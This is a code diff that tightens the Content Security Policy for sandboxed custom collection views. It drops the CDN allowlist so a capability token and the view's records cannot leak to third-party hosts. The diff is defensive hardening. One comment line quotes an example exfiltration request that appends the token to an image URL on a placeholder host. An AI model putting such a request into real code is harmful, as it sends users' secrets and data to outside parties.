@@ -66,16 +66,33 @@ export function buildHtmlPreviewCsp(origin?: string, cdns: readonly string[] = H
 
 /**
  * CSP for a custom collection view (see plans/feat-collections-custom-views.md).
- * Identical to the preview policy EXCEPT `connect-src` is the explicit server
- * origin (not `'none'`): a custom view legitimately `fetch()`es its
- * collection's data endpoint. Constraining `connect-src` to the origin keeps
- * the anti-exfiltration property — the view reaches its own data endpoint but
- * no third-party host. `origin` MUST be the explicit server origin (the
- * sandboxed iframe has an opaque origin, so `'self'` would never match — same
- * reason `img-src` takes the explicit origin).
+ *
+ * Unlike the preview policy, a custom view is handed a **secret** — the scoped
+ * capability token in `window.__MC_VIEW.token` — plus the collection's records.
+ * That changes the threat model: ANY third-party resource destination becomes
+ * an exfiltration channel, because the token/data can ride out in a request URL
+ * (`new Image().src = "https://cdn.example/x?" + token`) and `connect-src` does
+ * NOT govern script/style/font/img loads. So this policy allows **no
+ * third-party hosts at all** (no CDN allowlist):
+ *   - `script-src` / `style-src`: inline only.
+ *   - `img-src` / `font-src`: same-origin + `data:` / `blob:` only — same-origin
+ *     can only reach our own (loopback) server, never an attacker.
+ *   - `connect-src`: the server origin only — the view fetches its data endpoint
+ *     and nothing else.
+ *
+ * `origin` MUST be the explicit server origin: the sandboxed iframe has an
+ * opaque origin, so `'self'` would never match (same reason the preview policy
+ * substitutes the origin into `img-src`).
  */
-export function buildCustomViewCsp(origin: string, cdns: readonly string[] = HTML_PREVIEW_CSP_ALLOWED_CDNS): string {
-  return buildCsp(origin, origin, cdns);
+export function buildCustomViewCsp(origin: string): string {
+  return [
+    "default-src 'none'",
+    "script-src 'unsafe-inline'",
+    "style-src 'unsafe-inline'",
+    `img-src ${origin} data: blob:`,
+    "font-src data:",
+    `connect-src ${origin}`,
+  ].join("; ");
 }
 
 /**
